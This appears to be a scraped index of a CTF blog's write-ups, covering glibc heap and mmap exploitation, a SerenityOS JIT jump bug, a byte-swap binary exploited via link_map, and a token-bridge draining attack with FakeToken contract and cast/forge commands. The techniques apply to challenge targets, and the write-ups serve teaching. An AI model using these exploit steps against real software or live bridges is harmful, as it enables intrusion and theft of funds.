(INTERNAL_SIZE_T nb, mstate av) { ... /* If have mmap, and the request size meets the mmap threshold, and the system supports mmap, and there are few enough currently allocated mmapped regions, try to directly map this request rather than expanding top. */ if (av == NULL || ((unsigned long) (nb) \u003e= (unsigned long) (mp_.mmap_threshold) \u0026\u0026 (mp_.n_mmaps \u003c mp_.n_mmaps_max))) { char *mm; #if HAVE_TUNABLES if (mp_.hp_pagesize \u003e 0 \u0026\u0026 nb \u003e= mp_.hp_pagesize) { /* There is no need to isse the THP madvise call if Huge Pages are used directly. */ mm = sysmalloc_mmap (nb, mp_.hp_pagesize, mp_.hp_flags, av); if (mm != MAP_FAILED) return mm; } #endif mm = sysmalloc_mmap (nb, pagesize, 0, av); if (mm != MAP_FAILED) return mm; tried_mmap = true; } ... } Let’s examine the heap memory layout when we execute malloc(0x21000). gef\u003e vmmap ... 0x00007ffff7d8c000 0x00007ffff7db1000 0x0000000000025000 0x0000000000000000 rw- \u003ctls-th1\u003e ... gef\u003e x/20gx 0x00007ffff7d8c000 0x7ffff7d8c000: 0x0000000000000000 0x0000000000022002 0x7ffff7d8c010: 0x45793d7536367100 0x703d5e772852523b You’ll notice that the chunk is positioned near the tls and libc areas. This means that by calling malloc(0x21000), this kind of setup allows us to overwrite one-byte at any writable address within the tls and libc regions. But what if we want to write more? The first idea might be to free the chunk and then call malloc again. However, trying this initially leads to an error as follows. How many bytes would you like to bet on ? \u003e 135168 [1] 58259 invalid system call ./flag_roulette_patched Using strace, we found a brk syscall, showing us that our attempt to use malloc didn’t trigger mmap as we expected. brk(0x55bf6fa19000) = 0xc +++ killed by SIGSYS +++ [1] 58515 invalid system call strace ./flag_roulette_patched Digging into why this happened, we looked at how free works and discovered something interesting. When you free a chunk that was allocated with mmap, it changes the mp_.mmap_threshold to the size of the chunk you just freed. So, our next malloc(0x21000) didn’t use mmap because, according to the new threshold, 0x21000 wasn’t big enough. void __libc_free (void *mem) { ... if (chunk_is_mmapped (p)) /* release mmapped memory. */ { /* See if the dynamic brk/mmap threshold needs adjusting. Dumped fake mmapped chunks do not affect the threshold. */ if (!mp_.no_dyn_threshold \u0026\u0026 chunksize_nomask (p) \u003e mp_.mmap_threshold \u0026\u0026 chunksize_nomask (p) \u003c= DEFAULT_MMAP_THRESHOLD_MAX) { mp_.mmap_threshold = chunksize (p); mp_.trim_threshold = 2 * mp_.mmap_threshold; LIBC_PROBE (memory_mallopt_free_dyn_thresholds, 2, mp_.mmap_threshold, mp_.trim_threshold); } munmap_chunk (p); } ... } To get around this, we need a good strategy. We noticed something in the __libc_free function: it only changes the mp_.mmap_threshold if mp_.no_dyn_threshold is 0 (false). We still have a one-byte out-of-bounds (OOB) write ability from when we allocated our chunk, and this offset from the libc area doesn’t chang","date":"Mar 04, 2024","objectID":"/posts/gcc-ctf-2024/:1:2","tags":["Writeup","GCC CTF","heap","mmap","tls dtor","2024"],"title":"GCC CTF 2024","uri":"/posts/gcc-ctf-2024/"},{"categories":null,"content":" DiceCTF 2024 Quals. We secured the first place I played with the Blue Water team in the DiceCTF 2024 Quals. We managed to secure the first place. A huge shoutout and thanks to my awesome teammates for their fantastic teamwork during it! Below is the writeup for the pwn challenges that I managed to solve. Pwn ","date":"Feb 05, 2024","objectID":"/posts/dicectf-2024-quals/:0:0","tags":["Writeup","pwn","heap","javascript","serenity","2024"],"title":"DiceCTF 2024 Quals","uri":"/posts/dicectf-2024-quals/"},{"categories":null,"content":"hop Description Using 32 bits to encode a short jump is so wasteful… this will surely be better🐞🤓 nc mc.ax 32421 ","date":"Feb 05, 2024","objectID":"/posts/dicectf-2024-quals/:1:0","tags":["Writeup","pwn","heap","javascript","serenity","2024"],"title":"DiceCTF 2024 Quals","uri":"/posts/dicectf-2024-quals/"},{"categories":null,"content":"Initial Analysis In this challenge, we were provided with a zip file containing the Dockerfile used to build the challenge, along with a patch file. Below is the content of the patch file. Base: https://github.com/SerenityOS/serenity/tree/fbde901614368dcf03d4a8eee800d8b89131465f diff --git a/Userland/Libraries/LibJIT/X86_64/Assembler.h b/Userland/Libraries/LibJIT/X86_64/Assembler.h index 79b96cf81f..465c4cb38c 100644 --- a/Userland/Libraries/LibJIT/X86_64/Assembler.h +++ b/Userland/Libraries/LibJIT/X86_64/Assembler.h @@ -472,12 +472,23 @@ struct X86_64Assembler { private: void link_jump(X86_64Assembler\u0026 assembler, size_t offset_in_instruction_stream) { - auto offset = offset_of_label_in_instruction_stream.value() - offset_in_instruction_stream; + auto offset = static_cast\u003cssize_t\u003e(offset_of_label_in_instruction_stream.value() - offset_in_instruction_stream); auto jump_slot = offset_in_instruction_stream - 4; - assembler.m_output[jump_slot + 0] = (offset \u003e\u003e 0) \u0026 0xff; - assembler.m_output[jump_slot + 1] = (offset \u003e\u003e 8) \u0026 0xff; - assembler.m_output[jump_slot + 2] = (offset \u003e\u003e 16) \u0026 0xff; - assembler.m_output[jump_slot + 3] = (offset \u003e\u003e 24) \u0026 0xff; + if (offset \u003c= INT8_MAX \u0026\u0026 offset \u003e= INT8_MIN \u0026\u0026 assembler.m_output[jump_slot - 1] == 0xE9) { + auto small_offset = static_cast\u003cint8_t\u003e(offset + 3); + // JMP rel8 + assembler.m_output[jump_slot - 1] = 0xEB; + assembler.m_output[jump_slot + 0] = small_offset; + // NOP3_OVERRIDE_NOP + assembler.m_output[jump_slot + 1] = 0x0F; + assembler.m_output[jump_slot + 2] = 0x1F; + assembler.m_output[jump_slot + 3] = 0x00; + } else { + assembler.m_output[jump_slot + 0] = (offset \u003e\u003e 0) \u0026 0xff; + assembler.m_output[jump_slot + 1] = (offset \u003e\u003e 8) \u0026 0xff; + assembler.m_output[jump_slot + 2] = (offset \u003e\u003e 16) \u0026 0xff; + assembler.m_output[jump_slot + 3] = (offset \u003e\u003e 24) \u0026 0xff; + } } }; The patch targets the JIT (Just-In-Time compilation) code of LibJS in SerenityOS. Examining the patch reveals a significant bug. The intention behind the patch is to replace a relative JMP offset instruction with a relative JMP short offset. However, an issue arises in how the small_offset is calculated. By adding 3 to the offset and then casting it to int8_t, if the result of offset + 3 exceeds INT8_MAX, it leads to an overflow, resulting in a negative offset. Consequently, the JIT-compiled code behaves incorrectly. Instead of jumping forward to the intended destination, the overflow causes a jump to a preceding instruction, disrupting the intended flow of execution. ","date":"Feb 05, 2024","objectID":"/posts/dicectf-2024-quals/:1:1","tags":["Writeup","pwn","heap","javascript","serenity","2024"],"title":"DiceCTF 2024 Quals","uri":"/posts/dicectf-2024-quals/"},{"categories":null,"content":"Solution Based on the bug we identified, let’s start by setting up our local environment. The first step involves cloning the SerenityOS repository and applying the patch. git clone https://github.com/SerenityOS/serenity/ cd serenity git checkout fbde901614368dcf03d4a8eee800d8b89131465f git apply ../patch Before proceeding to build the js engine, a small adjustment will simplify our debugging process. Navigate to the serenity/Userland/Libraries/LibJS/JIT/Compiler.cpp file and modify the DUMP_JIT_DISASSEMBLY value to 1. This adjustment ensures that whenever we execute JavaScript code using the js engine that triggers JIT compilation, the engine will automatically dump the disassembly of the JIT-compiled code. With this setting enabled, we are now ready to proceed with building the js engine. ./Meta/serenity.sh build lagom js First, we’ll begin by crafting a simple script to examine the JIT-compiled code’s behavior. function test() { if (1 === 1) { return 41414141 } return [42424242]; } for (let i = 0; i \u003c 0x1000; i++) {test();} console.log(\"Hello World\"); Block 2: 2:0 LoadImmediate undefined: 0x00007fc11cc5c266 48 b8 00 00 00 00 00 mov rax, 0x7ffe000000000000 0x00007fc11cc5c26d 00 fe 7f 0x00007fc11cc5c270 49 89 c4 mov r12,rax 2:20 LoadImmediate 41414141: 0x00007fc11cc5c273 48 b8 fd ed 77 02 00 mov rax, 0x7ffa00000277edfd 0x00007fc11cc5c27a 00 fa 7f 0x00007fc11cc5c27d 49 89 c4 mov r12,rax 2:40 Return: 0x00007fc11cc5c280 4c 89 e0 mov rax,r12 0x00007fc11cc5c283 48 89 43 20 mov [rbx+0x20],rax 0x00007fc11cc5c287 eb 47 jmp short 1cc5c2d0 \u003ccommon_exit\u003e 0x00007fc11cc5c289 0f 1f 00 nop [rax] Block 3: 3:0 LoadImmediate undefined: 0x00007fc11cc5c28c 48 b8 00 00 00 00 00 mov rax, 0x7ffe000000000000 0x00007fc11cc5c293 00 fe 7f 0x00007fc11cc5c296 49 89 c4 mov r12,rax 3:20 Jump @4: 0x00007fc11cc5c299 eb 03 jmp short 1cc5c29e \u003cBlock 4\u003e 0x00007fc11cc5c29b 0f 1f 00 nop [rax] Block 4: 4:0 NewPrimitiveArray [ 42424242 ]: 0x00007fc11cc5c29e 48 be 48 2c 81 b6 5f mov rsi, 0x0000555fb6812c48 0x00007fc11cc5c2a5 55 00 00 0x00007fc11cc5c2a8 ba 01 00 00 00 mov edx, 0x00000001 0x00007fc11cc5c2ad 57 push rdi 0x00007fc11cc5c2ae 6a 00 push 0x00 0x00007fc11cc5c2b0 48 b8 d0 37 0a 1d c1 mov rax, 0x00007fc11d0a37d0 0x00007fc11cc5c2b7 7f 00 00 0x00007fc11cc5c2ba ff d0 call eax 0x00007fc11cc5c2bc 48 83 c4 08 add rsp,0x08 0x00007fc11cc5c2c0 5f pop rdi 0x00007fc11cc5c2c1 49 89 c4 mov r12,rax 4:20 Return: 0x00007fc11cc5c2c4 4c 89 e0 mov rax,r12 0x00007fc11cc5c2c7 48 89 43 20 mov [rbx+0x20],rax 0x00007fc11cc5c2cb eb 03 jmp short 1cc5c2d0 \u003ccommon_exit\u003e 0x00007fc11cc5c2cd 0f 1f 00 nop [rax] common_exit: 0x00007fc11cc5c2d0 4c 89 23 mov [rbx],r12 0x00007fc11cc5c2d3 41 5f pop r15 0x00007fc11cc5c2d5 41 5e pop r14 0x00007fc11cc5c2d7 41 5d pop r13 0x00007fc11cc5c2d9 41 5c pop r12 0x00007fc11cc5c2db 5b pop rbx 0x00007fc11cc5c2dc 5b pop rbx 0x00007fc11cc5c2dd c9 leave 0x00007fc11cc5c2de c3 ret Upon analyzing the dumped results, we notice that each return statement triggers a relative JMP instruction to common_exit, which the patch then converts into a jmp short. Observing the disassembly, our goal becomes clear: to extend the jmp short offset when returning 41414141. The presence of return [42424242] in the JIT-compiled code, as mentioned above, indicates that to enlarge the jmp short offset for returning 41414141, we can simply incorporate multiple values to be returned in that line. For instance, altering the script as follows increases the offset. function test() { if (1 === 1) { return 41414141 } return [42424242], 43434343; } for (let i = 0; i \u003c 0x1000; i++) {test();} console.log(\"Hello World\"); Block 2: 2:0 LoadImmediate undefined: 0x00007f4c10fac266 48 b8 00 00 00 00 00 mov rax, 0x7ffe000000000000 0x00007f4c10fac26d 00 fe 7f 0x00007f4c10fac270 49 89 c4 mov r12,rax 2:20 LoadImmediate 41414141: 0x00007f4c10fac273 48 b8 fd ed 77 02 00 mov rax, 0x7ffa00000277edfd 0x00007f4c10fac27a 00 fa 7f 0x00007f4c10fac27d 49 89 c4 mov r12,rax 2:40 Return: 0x00007f4c10fac280 4c 89 e0 mov r","date":"Feb 05, 2024","objectID":"/posts/dicectf-2024-quals/:1:2","tags":["Writeup","pwn","heap","javascript","serenity","2024"],"title":"DiceCTF 2024 Quals","uri":"/posts/dicectf-2024-quals/"},{"categories":null,"content":"boogie-woogie Description i’ve been watching too much jjk due to super bruteforce, we are forced to add POW. this is why we can’t have nice things nc mc.ax 31040 ","date":"Feb 05, 2024","objectID":"/posts/dicectf-2024-quals/:2:0","tags":["Writeup","pwn","heap","javascript","serenity","2024"],"title":"DiceCTF 2024 Quals","uri":"/posts/dicectf-2024-quals/"},{"categories":null,"content":"Initial Analysis For this challenge, we were presented with a binary named boogie-woogie. The initial step involved examining the binary’s mitigations. ╰─❯ checksec boogie-woogie Arch: amd64-64-little RELRO: Full RELRO Stack: Canary found NX: NX enabled PIE: PIE enabled All protections were found to be active. Now, it’s time to check the disassembly of the important functions: main int __cdecl main(int argc, const char **argv, const char **envp) { __int64 v4; // [rsp+8h] [rbp-18h] BYREF __int64 v5; // [rsp+10h] [rbp-10h] BYREF unsigned __int64 v6; // [rsp+18h] [rbp-8h] v6 = __readfsqword(0x28u); puts(_art); puts(s); while ( data[0] ) { v5 = 0LL; printf(\"\\n\\x1B[31;49;1;4m%s\\x1B[0m\\n\\n\\n\", data); puts( \"The sound of \\x1B[0;33mgion shoja bells\\x1B[0m echoes the impermanence of all things. The color\\n\" \"of \\x1B[0;33msala flowers\\x1B[0m reveals the truth that the prosperous must decline. \\x1B[4;33mHowever\\x1B[0m! We\\n\" \"are the exception:\"); __isoc99_scanf(\"%zu %zu\", \u0026v4, \u0026v5); clap(v4, v5); } return 0; } clap char *__fastcall clap(__int64 a1, __int64 a2) { char *result; // rax data[a1] ^= data[a2]; data[a2] ^= data[a1]; result = \u0026data[a1]; data[a1] ^= data[a2]; return result; } The binary’s structure is straightforward. Essentially, it allows for the swapping of bytes within any rw (read-write) area of the binary, specifically relative to the bss section (where data is stored). This byte-swapping capability is the sole interaction allowed, and the program terminates if the value at data[0] is set to NULL. ","date":"Feb 05, 2024","objectID":"/posts/dicectf-2024-quals/:2:1","tags":["Writeup","pwn","heap","javascript","serenity","2024"],"title":"DiceCTF 2024 Quals","uri":"/posts/dicectf-2024-quals/"},{"categories":null,"content":"Solution Despite the binary’s simplicity, crafting an exploit poses a significant challenge. Brute-force heap offset Initially, we can leak any value if we know its offset relative to the data, by exchanging the target_offset with 0x96. The value 0x96 represents the final byte in the data string, indicating that swapping and moving our target value to data[0x96] will result in its display on the prompt. The primary challenge arises from the fact that the bss area lacks valuable information for leakage, except for the PIE base address. This limitation prompts the exploration of alternative strategies, such as attempting to brute-force the heap offset. Notably, if a viable offset within the heap can be identified, it becomes feasible to trace back to the heap’s top chunk, and we can do more with it later on. Is brute-forcing the heap offset a feasible strategy? Indeed, it is. Typically, the heap spans an area of 0x21000. Observations indicate that the gap between the bss and heap areas ranges from approximately 0x0XXY000 to 0x1XXY000. Given the heap’s default size exceeds 0x10000, correctly deducing the XX nibble ensures that any Y nibble exist, thus significantly reducing the brute-force effort to roughly 8 bits. This reduction means that the brute-force approach is quite practical. Leak libc address Let say that we are abole to brute-force the heap offset and identifying the top chunk, the next question is: what possibilities does this open up? A close examination of the heap chunks in gdb reveals the default layout. Chunk(addr = 0x555555564000 , size=0x290, flags=PREV_INUSE) Chunk(addr = 0x555555564290 , size=0x410, flags=PREV_INUSE) Chunk(addr = 0x5555555646a0 , size=0x410, flags=PREV_INUSE) Chunk(addr = 0x555555564ab0 , size=0x20550, flags=PREV_INUSE) \u003c- top Unfortunately, it does not contain any directly useful values for leakage. However, an intriguing opportunity arises with the potential to corrupt the top chunk size. Now, consider the scenario where the top chunk size is altered from 0x20550 to merely 0x550 with the swap. It’s observed that triggering a malloc(0x800) call is straightforward via scanf, especially by prefixing our inputted number with numerous leading zeros. What implications would this manipulation have when combined with a malloc(0x800) call triggered by scanf? --- BEFORE SCANF (CORRUPTED TOP CHUNK) gef\u003e heap chunks Chunk(addr = 0x555555564000 , size=0x290, flags=PREV_INUSE) Chunk(addr = 0x555555564290 , size=0x410, flags=PREV_INUSE) Chunk(addr = 0x5555555646a0 , size=0x410, flags=PREV_INUSE) Chunk(addr = 0x555555564ab0 , size=0x550, flags=PREV_INUSE) \u003c- top --- AFTER SCANF gef\u003e heap chunks Chunk(addr = 0x555555564000 , size=0x290, flags=PREV_INUSE) Chunk(addr = 0x555555564290 , size=0x410, flags=PREV_INUSE) Chunk(addr = 0x5555555646a0 , size=0x410, flags=PREV_INUSE) Chunk(addr = 0x555555564ab0 , size=0x530, flags=PREV_INUSE, fd=0x7ffff7e1ace0, bk=0x7ffff7e1ace0) \u003c- unsortedbins[1/1] Chunk(addr = 0x555555564fe0 , size=0x10, flags=) Chunk(addr = 0x555555564ff0 , size=0x10, flags=PREV_INUSE) Upon inspecting the heap’s state in gdb following our manipulation, we observe the presence of an unsorted bin chunk. This opens the door to leaking a libc address. Having the libc address leads to several exploitation pathways. Exploitation via link_map In our approach, we opted for the link_map exploitation technique, as detailed in nobodyisnobody’s article. To effectively trigger the code outlined in glibc’s dl-fini.c, a series of steps are required: Nullify the link_map-\u003eDT_FINI_ARRAY. Overwrite link_map-\u003el_info[DT_FINI] with an address we control, allowing us to modify the d_un.d_ptr value subsequently. Adjust link_map-\u003el_Addr and link_map-\u003el_info[DT_FINI]-\u003ed_un.d_ptr so the sum of their values will point to our desired function address. Trigger exit. Exploring the possibilities with one_gadget, we identified one good gadget. 0xebc85 execve(\"/bin/sh\", r10, rdx) constraints: address rbp-0x78 is writable [r10] == ","date":"Feb 05, 2024","objectID":"/posts/dicectf-2024-quals/:2:2","tags":["Writeup","pwn","heap","javascript","serenity","2024"],"title":"DiceCTF 2024 Quals","uri":"/posts/dicectf-2024-quals/"},{"categories":null,"content":" Real World CTF 2024. We secured the fourth place I played with the Blue Water team in the Real World CTF 2024. We managed to secure the fourth place. A huge shoutout and thanks to my awesome teammates for their fantastic teamwork during it! During playing this CTF, I got first blood in Real World CTF 2024 by solving the blockchain challenge called safebridge. First Blood! This challenge offers a refreshing and realistic perspective, standing out from the usual blockchain scenarios in CTFs, as it closely aligns with actual blockchain vulnerabilities encountered in the real world. Below is the writeup for it. Blockchain ","date":"Jan 28, 2024","objectID":"/posts/real-world-ctf-2024/:0:0","tags":["Writeup","blockchain","EVM","bridge","2024"],"title":"Real World CTF 2024","uri":"/posts/real-world-ctf-2024/"},{"categories":null,"content":"SafeBridge Description I’ve crafted what I believed to be an ultra-safe token bridge. Don’t believe it? nc 47.251.56.125 1337 ","date":"Jan 28, 2024","objectID":"/posts/real-world-ctf-2024/:1:0","tags":["Writeup","blockchain","EVM","bridge","2024"],"title":"Real World CTF 2024","uri":"/posts/real-world-ctf-2024/"},{"categories":null,"content":"Initial Analysis In this challenge, we were provided with a zip file containing the necessary setup. The file includes numerous documents, but I’ll focus on explaining only the key ones. Let’s begin by examining Challenge.sol to grasp the objective of this challenge. pragma solidity ^0.8.20; import {IERC20} from \"@openzeppelin/contracts/token/ERC20/IERC20.sol\"; contract Challenge { address public immutable BRIDGE; address public immutable MESSENGER; address public immutable WETH; constructor(address bridge, address messenger, address weth) { BRIDGE = bridge; MESSENGER = messenger; WETH = weth; } function isSolved() external view returns (bool) { return IERC20(WETH).balanceOf(BRIDGE) == 0; } } From the Challenge.sol file, it’s clear that our goal is to reduce the BRIDGE balance to 0. For those unfamiliar with the concept of a bridge in this context, it refers to a mechanism that allows the transfer of assets and information between two different blockchain networks. This functionality is crucial in a decentralized environment where interoperability between different blockchains is needed. Now, let’s examine the challenge.py file to understand the details of the challenge setup. from typing import Dict from eth_abi import abi from ctf_launchers.pwn_launcher import PwnChallengeLauncher from ctf_launchers.types import (DaemonInstanceArgs, LaunchAnvilInstanceArgs, UserData, get_additional_account, get_privileged_web3) from ctf_launchers.utils import (anvil_setCodeFromFile, anvil_setStorageAt, deploy) class Challenge(PwnChallengeLauncher): def get_anvil_instances(self) -\u003e Dict[str, LaunchAnvilInstanceArgs]: return { \"l1\": self.get_anvil_instance(chain_id=78704, accounts=3, fork_url=None), \"l2\": self.get_anvil_instance(chain_id=78705, accounts=3, fork_url=None), } def get_daemon_instances(self) -\u003e Dict[str, DaemonInstanceArgs]: return {\"relayer\": DaemonInstanceArgs(image=\"safe-bridge-relayer:latest\")} def deploy(self, user_data: UserData, mnemonic: str) -\u003e str: l1_web3 = get_privileged_web3(user_data, \"l1\") l2_web3 = get_privileged_web3(user_data, \"l2\") challenge = deploy( l1_web3, self.project_location, mnemonic=mnemonic, env={ \"L1_RPC\": l1_web3.provider.endpoint_uri, \"L2_RPC\": l2_web3.provider.endpoint_uri, }, ) anvil_setCodeFromFile( l2_web3, \"0x420000000000000000000000000000000000CAFe\", \"L2CrossDomainMessenger.sol:L2CrossDomainMessenger\", ) relayer = get_additional_account(mnemonic, 0) anvil_setStorageAt( l2_web3, \"0x420000000000000000000000000000000000CAFe\", hex(0), \"0x\" + relayer.address[2:].rjust(64, \"0\"), ) default_xdomain_sender = \"0x000000000000000000000000000000000000dEaD\" anvil_setStorageAt( l2_web3, \"0x420000000000000000000000000000000000CAFe\", hex(5), \"0x\" + default_xdomain_sender[2:].rjust(64, \"0\"), ) anvil_setCodeFromFile( l2_web3, \"0x420000000000000000000000000000000000baBe\", \"L2ERC20Bridge.sol:L2ERC20Bridge\", ) l2messenger_addr = \"0x420000000000000000000000000000000000CAFe\" (l1_bridge_addr,) = abi.decode( [\"address\"], l1_web3.eth.call( { \"to\": challenge, \"data\": l1_web3.keccak(text=\"BRIDGE()\")[:4].hex(), } ), ) anvil_setStorageAt( l2_web3, \"0x420000000000000000000000000000000000baBe\", hex(0), \"0x\" + l2messenger_addr[2:].rjust(64, \"0\"), ) anvil_setStorageAt( l2_web3, \"0x420000000000000000000000000000000000baBe\", hex(1), \"0x\" + l1_bridge_addr[2:].rjust(64, \"0\"), ) anvil_setCodeFromFile( l2_web3, \"0xDeadDeAddeAddEAddeadDEaDDEAdDeaDDeAD0000\", \"L2WETH.sol:L2WETH\", ) return challenge Challenge().run() From the code in challenge.py, we can see that the challenge is designed to create two blockchain networks, referred to as L1 and L2. The setup involves deploying various contracts on each chain, which we will explore in more detail later. By analyzing the deploy function from utils.py, we notice that it executes another deployment script located in Deploy.s.sol. Next, let’s delve into the contents of the Deploy.s.sol file. pragma solidity ^0.8.20; import {Script} from \"forge-std/Script.sol\"; import \"src/L1/WETH.sol\"; import","date":"Jan 28, 2024","objectID":"/posts/real-world-ctf-2024/:1:1","tags":["Writeup","blockchain","EVM","bridge","2024"],"title":"Real World CTF 2024","uri":"/posts/real-world-ctf-2024/"},{"categories":null,"content":"Finding the Bug We understand that the objective is to drain the bridge, and from the initial setup, we know that the bridge already has 2 ETH deposited in it. My approach here was to start by looking for a bug in the most basic aspect, which is how to drain the bridge. Naturally, the first thing that must be triggered is for the bridge to perform an ETH transfer. This can only happen if we initiate a withdrawal from the L2 bridge. However, it’s apparent that for the withdrawal to take place, we must already have a balance in the deposits map. Therefore, it’s highly likely that there is a bug in the deposit function of the L1 bridge, causing the states of the L1 and L2 bridges to be unsynchronized. Based on this backtracking thought process, we can start searching for the bug by focusing on the deposit function in the L1 bridge. function _initiateERC20Deposit(address _l1Token, address _l2Token, address _from, address _to, uint256 _amount) internal { IERC20(_l1Token).safeTransferFrom(_from, address(this), _amount); bytes memory message; if (_l1Token == weth) { message = abi.encodeWithSelector( IL2ERC20Bridge.finalizeDeposit.selector, address(0), Lib_PredeployAddresses.L2_WETH, _from, _to, _amount ); } else { message = abi.encodeWithSelector(IL2ERC20Bridge.finalizeDeposit.selector, _l1Token, _l2Token, _from, _to, _amount); } sendCrossDomainMessage(l2TokenBridge, message); deposits[_l1Token][_l2Token] = deposits[_l1Token][_l2Token] + _amount; emit ERC20DepositInitiated(_l1Token, _l2Token, _from, _to, _amount); } Indeed, upon closer examination, a bug was identified. The flaw lies in the deposit process, specifically when depositing with a pair of (WETH, randomToken). When such a deposit is made, the L2 bridge is instructed to mint WETH on the L2 chain instead of the random token, but the balance updated in the L1 records the pair as (WETH, randomToken). This discrepancy leads to a state misalignment between L1 and L2. Here’s what happens when we execute depositERC20(WETH, randomToken, 2 ETH): On the L1 side, the stored state reflects a deposit of 2 ETH corresponding to the (WETH, randomToken) pair. Contrarily, on the L2 side, instead of the randomToken, 2 of WETH tokens are minted and credited to you. Essentially, this process results in receiving free WETH. Due to the aforementioned bug, it becomes possible to withdraw WETH from the L2 chain, which then results in receiving it on the L1 chain. An important observation here is that the balance of the pair (WETH, randomToken) is not reduced as a result of this deposit. Instead, the balance reduction occurs for the pair (WETH, L2_WETH). Now, let’s consider a scenario where we control the randomToken, have set randomToken.l1Token to WETH, and can control the burn() function to ensure it doesn’t revert for any amount we specify. In such a situation, executing withdraw(randomToken, 2 ETH) will trigger a message relay to the L1 chain, instructing it to transfer additional WETH to us on L1. This withdrawal will be successful because the L1 chain still recognizes a balance in the pair (WETH, randomToken). As a result, we end up receiving an extra amount of ETH. Now that the bug has been pinpointed, we can progress to the exploitation phase. ","date":"Jan 28, 2024","objectID":"/posts/real-world-ctf-2024/:1:2","tags":["Writeup","blockchain","EVM","bridge","2024"],"title":"Real World CTF 2024","uri":"/posts/real-world-ctf-2024/"},{"categories":null,"content":"Exploitation To start our exploit, we first initiate the challenge to retrieve the necessary information. ╰─❯ nc 47.251.56.125 1337 team token? \u003cREDACTED\u003e 1 - launch new instance 2 - kill instance 3 - get flag action? 1 creating private blockchain... deploying challenge... your private blockchain has been set up it will automatically terminate in 1440 seconds --- rpc endpoints: - http://47.251.56.125:8545/AvvTHxbggxudgUKnrMpQhdRU/l1 - http://47.251.56.125:8545/AvvTHxbggxudgUKnrMpQhdRU/l2 private key: 0xb308373bfa60a8e22f7e38c2824a3095e3fbc086613a41d4620e80b057ac9e52 challenge contract: 0xbf1da21516b8975941638E0c8CD791713c88B15B We aim to get the addresses of L1Bridge and WETH on the L1 chain with the help of foundry CLI tools. cast call \u003cCHALLENGE_CONTRACT\u003e \"WETH()\" --rpc-url \u003cRPC_URL_L1\u003e --private-key \u003cPRIVATE_KEY\u003e cast call \u003cCHALLENGE_CONTRACT\u003e \"BRIDGE()\" --rpc-url \u003cRPC_URL_L1\u003e --private-key \u003cPRIVATE_KEY\u003e For the L2 contracts, their predetermined addresses can be found in Lib_PredeployAddresses.sol. // SPDX-License-Identifier: MIT pragma solidity ^0.8.20; library Lib_PredeployAddresses { address internal constant L2_CROSS_DOMAIN_MESSENGER = 0x420000000000000000000000000000000000CAFe; address internal constant L2_ERC20_BRIDGE = 0x420000000000000000000000000000000000baBe; address internal constant L2_WETH = payable(0xDeadDeAddeAddEAddeadDEaDDEAdDeaDDeAD0000); } We also retrieve our address using the given private key. cast wallet address --private-key \u003cPRIVATE_KEY\u003e We proceed by creating our own token, which we name FakeToken. This token implements the IL2StandardERC20 interface defined in the challenge. In the FakeToken, we don’t need to fully implement the mint and burn functions; they just need to ensure they don’t revert. When deploying FakeToken, it’s crucial to set the _l1Token to the WETH address deployed on the L1 bridge, so that FakeToken represents a pair of (WETH, FakeToken). // SPDX-License-Identifier: MIT pragma solidity ^0.8.20; contract FakeToken { address public l1Token; constructor(address _l1Token) { l1Token = _l1Token; } function mint(address _to, uint256 _amount) external { return; } function burn(address _from, uint256 _amount) external { return; } } Next, we deploy this token on the L2 chain. The steps I did are: Create a new folder called fake-token. cd fake-token. Call forge init. Put the FakeToken.sol inside src folder. Call forge create ./src/FakeToken.sol:FakeToken --rpc-url \u003cRPC_URL_L2\u003e --private-key \u003cPRIVATE_KEY\u003e --constructor-args \u003cL1_WETH\u003e Upon successful deployment, you should receive a confirmation output. Deployer: 0xfD0D9669CA24Ed6De5B51A3B6bE1dcB33DC8681b Deployed to: 0xB4d5bcb70Fa5e12387BbD98FC6D43752a8D59a23 \u003c- \u003cFAKE_TOKEN\u003e address Transaction hash: 0x41fe4d43167d9c77c46beb4521f9c465537ceb45f722a84e1318d92bfcd62299 The next step is to trigger depositERC20 on the L1 chain. We start by wrapping our native ether into WETH on L1. cast send \u003cL1_WETH\u003e \"deposit()\" -r \u003cRPC_URL_L1\u003e --private-key \u003cPRIVATE_KEY\u003e --value 2ether Then, we allow the L1 bridge to use our deposited WETH (2 ETH). cast send \u003cL1_WETH\u003e \"approve(address,uint256)\" -r \u003cRPC_URL_L1\u003e --private-key \u003cPRIVATE_KEY\u003e -- \u003cL1_BRIDGE\u003e 2000000000000000000 Finally, we trigger the depositERC20(WETH, FakeToken, 2 ETH). cast send \u003cL1_BRIDGE\u003e \"depositERC20(address,address,uint256)\" -r \u003cRPC_URL_L1\u003e --private-key \u003cPRIVATE_KEY\u003e -- \u003cL1_WETH\u003e \u003cFAKE_TOKEN\u003e 2000000000000000000 After making this call, the state of the L1 bridge balance will show: deposits[WETH][L2_WETH] = 2 ETH from the initial challenge deposit. deposits[WETH][FakeToken] = 2 ETH from our deposit. To verify that the deposit worked and triggered the bug, we check the L2 chain balance. We should find 2 WETH there, confirming the bug’s activation. cast call \u003cL2_WETH\u003e \"balanceOf(address)\" -r \u003cRPC_URL_L2\u003e --private-key \u003cPRIVATE_KEY\u003e -- \u003cPLAYER_ADDRESS\u003e Then, we redeem this free WETH by calling withdraw(L2_WETH, 2 ETH). cast send \u003cL2_BRIDGE\u003e \"withdraw(address,uint256)\" -r \u003cRPC_URL_L2\u003e --private-","date":"Jan 28, 2024","objectID":"/posts/real-world-ctf-2024/:1:3","tags":["Writeup","blockchain","EVM","bridge","2024"],"title":"Real World CTF 2024","uri":"/posts/real-world-ctf-2024/"},{"categories":null,"content":" ASIS CTF Finals 2023. We got 8th place. To cap off the fantastic year of 2023, I participated with the SKSD team in the ASIS CTF Finals 2023, where we secured 8th place. I extend a huge shoutout and heartfelt thanks to my amazing teammates for their exceptional teamwork throughout the event! Below is the write-up for the QuickJS pwn challenge named isWebP.js. This challenge is a JavaScript engine pwn task, inspired by CVE-2023-4863. This challenge was solved by only three teams, and I was the third to successfully solve it. Pwn ","date":"Dec 30, 2023","objectID":"/posts/asis-ctf-finals-2023/:0:0","tags":["Writeup","ASIS CTF","pwn","quickjs","huffman","oob","2023"],"title":"ASIS CTF Finals 2023","uri":"/posts/asis-ctf-finals-2023/"},{"categories":null,"content":"isWebP.js Description Did you know that Javascript doesn’t have an image validator by default? That’s why I decided to implement something like isNaN for images (isPNG, isJpeg, isWebP). So far I’ve only implemented isWebP and I wanna do a beta test before submitting the proposal to ECMA. You can also test the feature via the address below. Can’t wait for your feedbacks! nc 5.75.200.150 1337 ","date":"Dec 30, 2023","objectID":"/posts/asis-ctf-finals-2023/:1:0","tags":["Writeup","ASIS CTF","pwn","quickjs","huffman","oob","2023"],"title":"ASIS CTF Finals 